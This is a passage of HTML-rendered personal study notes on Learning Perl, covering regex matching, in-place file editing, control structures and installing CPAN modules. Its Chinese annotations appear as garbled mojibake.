class="hljs-keyword">my</span> $z = <span class="hljs-keyword">join</span> <span class="hljs-string">&quot;-&quot;</span>, @values;<br></code></pre></td></tr></table></figure><h2 id="m-x2F-x2F-in-List-Context"><a href="#m-x2F-x2F-in-List-Context" class="headerlink" title="m&#x2F;&#x2F; in List Context"></a>m&#x2F;&#x2F; in List Context</h2><p>When a pattern match <code>m//</code> is used in a list context, the return value is a list of the capture variables created in the match, or an empty list if the match failed.</p><p><code>m//</code> æ˜¯é»˜è®¤çš„, ä¹Ÿå°±æ˜¯æ™®é€šçš„ <code>//</code>.</p><p>è¿”å›æ•è·ç»„ã€‚ä¹Ÿå¯ç”¨äºåˆ†ç¦»:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $text = <span class="hljs-string">&quot;Fred dropped a 5 ton granite block on Mr.Slate&quot;</span>;<br><span class="hljs-keyword">my</span> @words = ($text =~ <span class="hljs-regexp">/([a-z]+)/ig</span>);<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Result: @words\n&quot;</span>;<br></code></pre></td></tr></table></figure><h2 id="More-Powerful-Regular-Expressions"><a href="#More-Powerful-Regular-Expressions" class="headerlink" title="More Powerful Regular Expressions"></a>More Powerful Regular Expressions</h2><h3 id="Nongreedy-Quantifier"><a href="#Nongreedy-Quantifier" class="headerlink" title="Nongreedy Quantifier"></a>Nongreedy Quantifier</h3><p>Adding <code>?</code> after the quantifier</p><p>åŒ¹é…as few as possible, like:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">my</span> <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;&lt;b&gt;Fred&lt;/b&gt; and &lt;b&gt;Barney&lt;/b&gt;&#x27;</span>;<br><span class="hljs-attribute">my</span> <span class="hljs-variable">$match_count</span> = <span class="hljs-variable">$text</span> =<span class="hljs-regexp">~ s|&lt;b&gt;(.*?)&lt;/b&gt;|\U<span class="hljs-variable">$1</span>|g</span>;<br><span class="hljs-attribute">print</span> <span class="hljs-string">&quot;<span class="hljs-variable">$match_count</span>: <span class="hljs-variable">$text</span>\n&quot;</span>;<br></code></pre></td></tr></table></figure><p>ä¼šåŒ¹é…åˆ°ä¸¤ä¸ªè€Œä¸æ˜¯ä¸€ä¸ª.</p><h3 id="Fancier-Word-Boundaries"><a href="#Fancier-Word-Boundaries" class="headerlink" title="Fancier Word Boundaries"></a>Fancier Word Boundaries</h3><p>Adding in Perl 5.22, adding curly braces to denote:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> v5.<span class="hljs-number">22</span>;<br><br><span class="hljs-keyword">my</span> $string = <span class="hljs-string">&quot;this doesn&#x27;t capitalize correctly.&quot;</span>;<br>$string =~ <span class="hljs-regexp">s/\b&#123;wb&#125;(\w)/\U$1/g</span>;<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;$string\n&quot;</span>;<br></code></pre></td></tr></table></figure><p><code>\b&#123;wb&#125;</code> ç”¨äºå•è¯.<br><code>\b&#123;sb&#125;</code> ç”¨äºå¥å·.<br><code>\b&#123;lb&#125;</code> knows where to insert the newlines.</p><h3 id="Matching-Multiple-Line-Text"><a href="#Matching-Multiple-Line-Text" class="headerlink" title="Matching Multiple-Line Text"></a>Matching Multiple-Line Text</h3><p>Using <code>^</code> and <code>$</code> for whole string.</p><p>Adding <code>\m</code> for one line.</p><h3 id="Updating-Many-Files"><a href="#Updating-Many-Files" class="headerlink" title="Updating Many Files"></a>Updating Many Files</h3><p>Perlâ€™s own <code>localtime</code> function.</p><p>The special variable <code>$^I</code>. By default itâ€™s undef, when thereâ€™s a string in <code>$^I</code>, that string is used as a backup filenameâ€™s extension. å³è¯¥å­—ç¬¦ä¸²å°±ä¼šå˜æˆå¤‡ä»½æ–‡ä»¶çš„æ‰©å±•åï¼Œæ–°çš„å†…å®¹ä¼šoutputåˆ°ä»¥åŸæ¥çš„æ–‡ä»¶åä¸ºåçš„æ–‡ä»¶ä¸­.</p><p>åªè¦è®¾ç½®äº†è¿™ä¸ªå˜é‡å°±ä¼šèµ·ä½œç”¨. ä¼šå°†åŸæ¥çš„æ–‡ä»¶åŠ ä¸Šè¿™ä¸ªæ‰©å±•å.</p><p>Perlæ²¡æœ‰å®é™…ä¿®æ”¹ä¸€ä¸ªæ–‡ä»¶, å®ƒåˆ›å»ºäº†ä¸€ä¸ªæ–°æ–‡ä»¶å¹¶ä¼ å…¥æ›´æ–°çš„å†…å®¹.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment">#! /usr/bin/perl -w</span><br><br><span class="hljs-keyword">use</span> strict;<br><br><span class="hljs-keyword">chomp</span>(<span class="hljs-keyword">my</span> $date = <span class="hljs-string">`date`</span>);<br>$^I = <span class="hljs-string">&quot;.bak&quot;</span>;<br><br><span class="hljs-keyword">while</span> (&lt;&gt;) &#123;<br>  <span class="hljs-regexp">s/\AAuthor:.*/Author: Randal L. Schwartz/</span>;<br>  <span class="hljs-regexp">s/\APhone:.*\n//</span>;<br>  <span class="hljs-regexp">s/\ADate:.*/Date: $date/</span>;<br>  <span class="hljs-keyword">print</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="In-Place-Editing-from-the"><a href="#In-Place-Editing-from-the" class="headerlink" title="In-Place Editing from the"></a>In-Place Editing from the</h3><p>å‘½ä»¤è¡Œå‚æ•°:</p><p>Some options:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs routeros">-p    Telling Perl <span class="hljs-keyword">to</span> write a program <span class="hljs-keyword">for</span> you like:<br><span class="hljs-keyword">while</span> (&lt;&gt;) &#123;<br>   <span class="hljs-built_in">print</span> ;<br>&#125;<br><br>-n    Leaving out the automatic <span class="hljs-built_in">print</span> statement.<br><br>-i.bak    <span class="hljs-keyword">To</span> <span class="hljs-built_in">get</span> a backupfile, <span class="hljs-keyword">if</span> you don<span class="hljs-string">&#x27;t, using -i alone.</span><br><span class="hljs-string"></span><br><span class="hljs-string">-w    Turning on the warnings.</span><br><span class="hljs-string"></span><br><span class="hljs-string">-e    says &quot;executable code follows&quot; ä»£ç ä¼šæ·»åŠ åˆ°printä¹‹å‰.</span><br></code></pre></td></tr></table></figure><p>for example:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$ perl -<span class="hljs-selector-tag">p</span> -<span class="hljs-selector-tag">i</span><span class="hljs-selector-class">.bak</span> -w -e <span class="hljs-string">&#x27;s/Randall/Randal/g&#x27;</span> fred*.dat<br></code></pre></td></tr></table></figure><h2 id="Exercise-5"><a href="#Exercise-5" class="headerlink" title="Exercise"></a>Exercise</h2><p>æ‰“å¼€æ–‡ä»¶ï¼Œéœ€è¦åˆ¤æ–­æ˜¯å¦æˆåŠŸæ‰“å¼€ã€‚</p><h1 id="CHAPTER-10-More-Control-Structures"><a href="#CHAPTER-10-More-Control-Structures" class="headerlink" title="CHAPTER 10 More Control Structures"></a>CHAPTER 10 More Control Structures</h1><h2 id="The-unless-Control-Structure"><a href="#The-unless-Control-Structure" class="headerlink" title="The unless Control Structure"></a>The unless Control Structure</h2><p>Executing a block of code only whe n the conditional is false:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">unless</span> ($fred =~ <span class="hljs-regexp">/\A[A-Z_]\w*\z/i</span>) &#123;<br>  <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;The value of ...&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="The-else-Clause-with-unless"><a href="#The-else-Clause-with-unless" class="headerlink" title="The else Clause with unless"></a>The else Clause with unless</h3><p>The syntax is:</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lasso">unless () &#123;<br>  <span class="hljs-params">...</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-params">...</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="The-until-Control-Structure"><a href="#The-until-Control-Structure" class="headerlink" title="The until Control Structure"></a>The until Control Structure</h2><p>Revers  the condition of a while loop.</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">until</span> ($j &gt; $i) &#123;<br>  $j *= <span class="hljs-number">2</span><span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Statement-Modifiers"><a href="#Statement-Modifiers" class="headerlink" title="Statement Modifiers"></a>Statement Modifiers</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;<span class="hljs-variable">$n</span> is a negative number.\n&quot;</span> <span class="hljs-keyword">if</span> <span class="hljs-variable">$n</span> &lt; 0; <br></code></pre></td></tr></table></figure><p>Perl è¿˜æ˜¯ä¼ševaluated first.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl">&amp;error(<span class="hljs-string">&quot;Invalid input&quot;</span>) <span class="hljs-keyword">unless</span> &amp;valid($input);<br>$i *= <span class="hljs-number">2</span> <span class="hljs-keyword">until</span> $i &gt; $j;<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot; &quot;</span>, ($n += <span class="hljs-number">2</span>) <span class="hljs-keyword">while</span> $n &lt; <span class="hljs-number">10</span>;<br>&amp;greet($_) <span class="hljs-keyword">foreach</span> @person;<br></code></pre></td></tr></table></figure><h2 id="The-Naked-Block-Control-Structure"><a href="#The-Naked-Block-Control-Structure" class="headerlink" title="The Naked Block Control Structure"></a>The Naked Block Control Structure</h2><p>The so-called â€œnakedâ€ block  is one without a keyword or condition.</p><p>like:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<br>  <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Please enter a number: &quot;</span>;<br>  <span class="hljs-keyword">chomp</span>(<span class="hljs-keyword">my</span> $n = &lt;STDIN&gt;);<br>  <span class="hljs-keyword">my</span> $root = <span class="hljs-keyword">sqrt</span> $n;<br>  <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;The square root of $n is $root.\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸æ˜¯loopï¼Œåªè¿è¡Œä¸€æ¬¡.</p><h2 id="The-elsif-Clause"><a href="#The-elsif-Clause" class="headerlink" title="The elsif Clause"></a>The elsif Clause</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">if</span> ( ! <span class="hljs-keyword">defined</span> $dino ) &#123;<br>  <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;The value is undef.\n&quot;</span>;<br>&#125; <span class="hljs-keyword">elsif</span> ($dino =~ <span class="hljs-regexp">/^-?\d+\.?$/</span>) &#123;<br>  <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;The value is an integer.\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Autoincrement-and-Autodecrement"><a href="#Autoincrement-and-Autodecrement" class="headerlink" title="Autoincrement and Autodecrement"></a>Autoincrement and Autodecrement</h2><p>The autoincrement operator <code>++</code>.</p><p>The autodecrement operator <code>--</code>.</p><h2 id="The-for-Control-Structure"><a href="#The-for-Control-Structure" class="headerlink" title="The for Control Structure"></a>The for Control Structure</h2><p>like C:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">for (initialization<span class="hljs-comment">; test; increment) &#123;</span><br>body<span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="The-Secret-Connection-Between-foreach-and-for"><a href="#The-Secret-Connection-Between-foreach-and-for" class="headerlink" title="The Secret Connection Between foreach and for"></a>The Secret Connection Between foreach and for</h2><p>Inside the Perl parser, the keyword foreach is exactly equivalent tp the keyword for.</p><p>If it find semicolons, itâ€™s the C-style for.</p><h2 id="The-last-Operator"><a href="#The-last-Operator" class="headerlink" title="The last Operator"></a>The last Operator</h2><p>Like <code>break</code> operator in C.</p><p>The last operator immediately ends execution of the loop.</p><h2 id="The-next-Operator"><a href="#The-next-Operator" class="headerlink" title="The next Operator"></a>The next Operator</h2><p>Like <code>continue</code> operator in C.</p><p>å¼€å§‹ä¸‹ä¸€è½®å¾ªç¯.</p><h2 id="The-redo-Operator"><a href="#The-redo-Operator" class="headerlink" title="The redo Operator"></a>The redo Operator</h2><p>é‡æ–°å¼€å§‹å¾ªç¯.</p><h2 id="Labeled-Block"><a href="#Labeled-Block" class="headerlink" title="Labeled Block"></a>Labeled Block</h2><p>Lables in Perl are like other identifiers.</p><p>Recommending to make them to be all uppercase.</p><p>To lable a loop block, just put the label and a colon in front of the loop:</p><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs hsp"><span class="hljs-keyword">LINE</span>: <span class="hljs-keyword">while</span> (&lt;&gt;) &#123;<br>  <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">split</span>) &#123;<br>    last <span class="hljs-keyword">LINE</span> <span class="hljs-keyword">if</span> /__END__/<span class="hljs-comment">;</span><br>    ...<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>You may use lable after <code>lasr</code>, <code>next</code>, or <code>redo</code>.</p><h2 id="The-Conditional-Operator"><a href="#The-Conditional-Operator" class="headerlink" title="The Conditional Operator"></a>The Conditional Operator</h2><p>Cè¯­è¨€æœ‰çš„ä¸œè¥¿ï¼ŒPerlåŸºæœ¬ä¸Šä¹Ÿæœ‰.</p><p>The conditional operator: <code>?:</code>.</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">expression ? <span class="hljs-keyword">if</span>_<span class="hljs-literal">true</span>_expr : <span class="hljs-keyword">if</span>_<span class="hljs-literal">false</span>_expr<br></code></pre></td></tr></table></figure><h2 id="Logical-Operators"><a href="#Logical-Operators" class="headerlink" title="Logical Operators"></a>Logical Operators</h2><p>Logical AND operator <code>&amp;&amp;</code> and logical OR operator <code>||</code>.</p><h2 id="The-Value-of-a-Short-Circuit-Operator"><a href="#The-Value-of-a-Short-Circuit-Operator" class="headerlink" title="The Value of a Short-Circuit Operator"></a>The Value of a Short-Circuit Operator</h2><p>Using logical OR operator to selecting a default value:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $last_name = $last_name&#123;$someone&#125; || <span class="hljs-string">&#x27;(No last name)&#x27;</span>;<br></code></pre></td></tr></table></figure><h2 id="The-defined-or-Operator"><a href="#The-defined-or-Operator" class="headerlink" title="The defined-or Operator"></a>The defined-or Operator</h2><p>The defined-or operator <code>//</code>. Adding in perl 5.10:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">use v5.<span class="hljs-number">10</span>;<br><br>my <span class="hljs-variable">$last_name</span> = <span class="hljs-variable">$last_name</span>&#123;<span class="hljs-variable">$someone</span>&#125; <span class="hljs-regexp">//</span> <span class="hljs-string">&#x27;(No last name)&#x27;</span>;<br></code></pre></td></tr></table></figure><p>Set a value when there isnâ€™t one already:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> v5.<span class="hljs-number">10</span>;<br><span class="hljs-keyword">use</span> warning;<br><br><span class="hljs-keyword">my</span> $name;<br><span class="hljs-keyword">printf</span> <span class="hljs-string">&quot;%s&quot;</span>, $name // <span class="hljs-string">&#x27;&#x27;</span>;<br></code></pre></td></tr></table></figure><h2 id="Control-Structure-Using-Partial-Evaluation-Operators"><a href="#Control-Structure-Using-Partial-Evaluation-Operators" class="headerlink" title="Control Structure Using Partial-Evaluation Operators"></a>Control Structure Using Partial-Evaluation Operators</h2><p><code>&amp;&amp;</code>, <code>||</code>, <code>//</code>, and <code>?:</code> are share a peculiar property: depending upon the value on the left side, they may or may not evaluate an expression. They are sometimes called partial-evaluation operator.</p><h2 id="Exercise-6"><a href="#Exercise-6" class="headerlink" title="Exercise"></a>Exercise</h2><p>ä½¿ç”¨<code>say</code>å‡½æ•°è¦æ·»åŠ <code>use v5.10</code>.</p><h1 id="CHAPTER-11-Perl-Modules"><a href="#CHAPTER-11-Perl-Modules" class="headerlink" title="CHAPTER 11 Perl Modules"></a>CHAPTER 11 Perl Modules</h1><h2 id="Finding-Modules"><a href="#Finding-Modules" class="headerlink" title="Finding Modules"></a>Finding Modules</h2><p>Modules come in two types:</p><pre><code class="hljs">  1. Come with Perl  2. Get from CAPN  3. Vendor modules</code></pre><h3 id="Check-if-it-is-already-installed"><a href="#Check-if-it-is-already-installed" class="headerlink" title="Check if it is already installed"></a>Check if it is already installed</h3><p>One way, read with <code>perldoc</code>:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>perldoc <span class="hljs-title class_">Digest</span>::<span class="hljs-title class_">SHA</span><br></code></pre></td></tr></table></figure><h3 id="Give-details-on-a-module"><a href="#Give-details-on-a-module" class="headerlink" title="Give details on a module"></a>Give details on a module</h3><p>Using <code>capn</code> command:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>cpan -D <span class="hljs-title class_">Digest</span>::<span class="hljs-title class_">SHA</span><br></code></pre></td></tr></table></figure><h2 id="Install-Modules"><a href="#Install-Modules" class="headerlink" title="Install Modules"></a>Install Modules</h2><p>If you use <code>ExtUtils::MakeMaker</code>.</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>perl Makefile.PL<br><span class="hljs-variable">$ </span>make install<br></code></pre></td></tr></table></figure><p>Special another directory with an <code>INSTALL_BASE</code> argument to Makefile.PL:</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">$ perl Makefile.PL INSTALL_BASE=<span class="hljs-regexp">/Users/</span>fred/lib<br></code></pre></td></tr></table></figure><p>Using another module <code>Module::Build</code></p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>perl Build.PL<br><span class="hljs-variable">$ </span>./Build install<br></code></pre></td></tr></table></figure><p>Specify an alternate installation directory:</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">$ perl Build.PL --install_base=<span class="hljs-regexp">/Users/</span>fred/lib<br></code></pre></td></tr></table></figure><p>The <code>.pm</code> file extension stands for â€œPerl Moduleâ€.</p><p>å¯ç”¨perlè‡ªå·±çš„shellæ¥æ»¡è¶³ä¾èµ–:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">$ <span class="hljs-keyword">perl</span> -MCPAN -<span class="hljs-keyword">e</span> <span class="hljs-keyword">shell</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨<code>cpan</code>æ¥ä¸‹è½½, åé¢è·Ÿæ¨¡å—:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>cpan <span class="hljs-title class_">Module</span>::<span class="hljs-title class_">CoreList</span> <span class="hljs-title class_">LWP</span> <span class="hljs-title class_">CGI</span>::<span class="hljs-title class_">Prototype</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ Perl Package Manager (PPM) æ¥ä¸‹è½½:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>ppm time::<span class="hljs-title class_">Moment</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨<code>cpanm</code>(for cpanminus):</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>cpanm <span class="hljs-title class_">DBI</span> <span class="hljs-title class_">WWW</span>::<span class="hljs-title class_">Mechanize</span><br></code></pre></td></tr></table></figure><h2 id="Using-Your-Own-Directories"><a href="#Using-Your-Own-Directories" class="headerlink" title="Using Your Own Directories"></a>Using Your Own Directories</h2><p>Using <code>local::lib</code>.</p><p>To see what they set by loading the module on the command line:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>perl -<span class="hljs-symbol">Mlocal:</span>:<span class="hljs-class"><span class="hljs-keyword">lib</span></span><br></code></pre></td></tr></table></figure><h1 id="ç¬¬åä¸€ç« -Perl-æ¨¡å—-é‡è¯»"><a href="#ç¬¬åä¸€ç« -Perl-æ¨¡å—-é‡è¯»" class="headerlink" title="ç¬¬åä¸€ç«  Perl æ¨¡å— (é‡è¯»)"></a>ç¬¬åä¸€ç«  Perl æ¨¡å— (é‡è¯»)</h1><p>ç»å¤§éƒ¨åˆ† Perl 5 ä»£ç éƒ½æ˜¯ä»¥æ¨¡å—çš„å½¢å¼å­˜åœ¨çš„.</p><h2 id="å¯»æ‰¾æ¨¡å—"><a href="#å¯»æ‰¾æ¨¡å—" class="headerlink" title="å¯»æ‰¾æ¨¡å—"></a>å¯»æ‰¾æ¨¡å—</h2><p>Perl æ¨¡å—æœ‰ä¸¤ç§æ¥æº:</p><ul><li>éš Perl å‘è¡Œç‰ˆæœ¬ä¸€åŒæ‰“åŒ…</li><li>ä» CPAN ä¸‹è½½</li></ul><p>å¯ä½¿ç”¨ <code>perldoc</code> å‘½ä»¤æ‰“å¼€æ¨¡å—çš„æ–‡æ¡£.</p><p>Perl è‡ªå¸¦çš„ <code>cpan</code> å‘½ä»¤å¯ä»¥åˆ›å»º autobundle æ–‡ä»¶. å…¶ä¼šåˆ—å‡ºæ‰€æœ‰å·²ç»å®‰è£…äº†çš„æ¨¡å—, åŒ…æ‹¬ç‰ˆæœ¬å·:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ cpan -a<br></code></pre></td></tr></table></figure><h2 id="å®‰è£…æ¨¡å—"><a href="#å®‰è£…æ¨¡å—" class="headerlink" title="å®‰è£…æ¨¡å—"></a>å®‰è£…æ¨¡å—</h2><p>å…·ä½“æŸ¥çœ‹æ¨¡å—åŒ…çš„ README æ–‡ä»¶æˆ– INSTALL æ–‡ä»¶.</p><p>Perl çš„ä¸€ä¸ªè‡ªå¸¦çš„æ¨¡å— <code>ExtUtils:MakeMaker</code> å…¶æä¾›çš„ä¸€ç³»åˆ—å·¥å…·å¯ä»¥å¸®å¿™ç”Ÿæˆæ¨¡å—å®‰è£…æ–‡ä»¶.</p><p>ä½¿ç”¨ MakeMaker å°è£…:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ perl Makefile.PL<br>$ make install<br></code></pre></td></tr></table></figure><p>å¯æŒ‡å®šå®‰è£…ç›®å½•:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ perl MakeMaker.PL INSTALL_BASE=/Users/fred/lib<br></code></pre></td></tr></table></figure><p>æœ‰äº›æ¨¡å—çš„å·¥ä½œä¾èµ–äºå…¶ä»–æ¨¡å—, æ‰€ä»¥å¿…é¡»å…ˆå®‰è£…å¥½è¿™äº›å‰ç½®æ¨¡å—, æ‰èƒ½ç»§ç»­ç¼–è¯‘å®‰è£….</p><p>æ‰©å±•å <code>.pm</code> è¡¨ç¤º <code>Perl Module</code>.</p><p>å®‰è£…æ¨¡å—, å¯ä»¥ç”¨ <code>cpan + åŒ…å</code> å¦‚:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ cpan Module::CoreList<br></code></pre></td></tr></table></figure><h3 id="å®‰è£…åˆ°è‡ªå·±çš„ç›®å½•"><a href="#å®‰è£…åˆ°è‡ªå·±çš„ç›®å½•" class="headerlink" title="å®‰è£…åˆ°è‡ªå·±çš„ç›®å½•"></a>å®‰è£…åˆ°è‡ªå·±çš„ç›®å½•</h3><p>CPAN å·¥å…·é»˜è®¤ä¼šæŠŠæ¨¡å—è£…åˆ°ä¸ perl è§£é‡Šå™¨ç›¸åŒçš„ç›®å½•.</p><p>ä½¿ç”¨ <code>local::lib</code> æ¨¡å—, å¯ä»¥å°†æ–°æ¨¡å—å®‰è£…åˆ°è‡ªå·±çš„ç”¨æˆ·ç›®å½•ä¸‹.</p><p>åˆ—å‡º <code>local::lib</code> æ¨¡å—æ‰€æ”¹åŠ¨çš„æ‰€æœ‰ç¯å¢ƒå˜é‡è®¾å®š:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ perl -Mlocal::lib<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>-I</code> å‚æ•°, å°±å¯ä»¥æ ¹æ® <code>local::lib</code> ä¿®æ”¹çš„ç¯å¢ƒå˜é‡æ¥å®‰è£…æ¨¡å—:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ cpan -I Set::Crossproduct<br></code></pre></td></tr></table></figure><p>å¯ä»¥åœ¨ CPAN.pm é…ç½®ä¸­è®¾å®šä¸€äº›å‚æ•°.</p><p>å¯ä»¥ç”¨:</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-keyword">use</span> <span class="hljs-keyword">local</span>::<span class="hljs-keyword">lib</span><br></code></pre></td></tr></table></figure><p>æ¥å‘Šè¯‰ç¨‹åºåœ¨å“ªé‡Œæ‰¾æ¨¡å—.</p><h2 id="ä½¿ç”¨ç®€æ˜“æ¨¡å—"><a href="#ä½¿ç”¨ç®€æ˜“æ¨¡å—" class="headerlink" title="ä½¿ç”¨ç®€æ˜“æ¨¡å—"></a>ä½¿ç”¨ç®€æ˜“æ¨¡å—</h2><p>Unix ä¸Šçš„æ–‡ä»¶æˆ–ç›®å½•åç§°å¯èƒ½ä¼šåŒ…å«æ¢è¡Œç¬¦.</p><p><code>\s</code> é€‰é¡¹å¯ä»¥ä¿®æ­£ <code>.</code> æ— æ³•åŒ¹é…æ¢è¡Œç¬¦çš„é—®é¢˜.</p><h3 id="File-Basename-æ¨¡å—"><a href="#File-Basename-æ¨¡å—" class="headerlink" title="File::Basename æ¨¡å—"></a>File::Basename æ¨¡å—</h3><p>ä½¿ç”¨:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ perldoc File::Basename<br></code></pre></td></tr></table></figure><p>å¯ä»¥æŸ¥çœ‹æ–‡æ¡£.</p><p>åŠ è½½æ¨¡å—:</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span 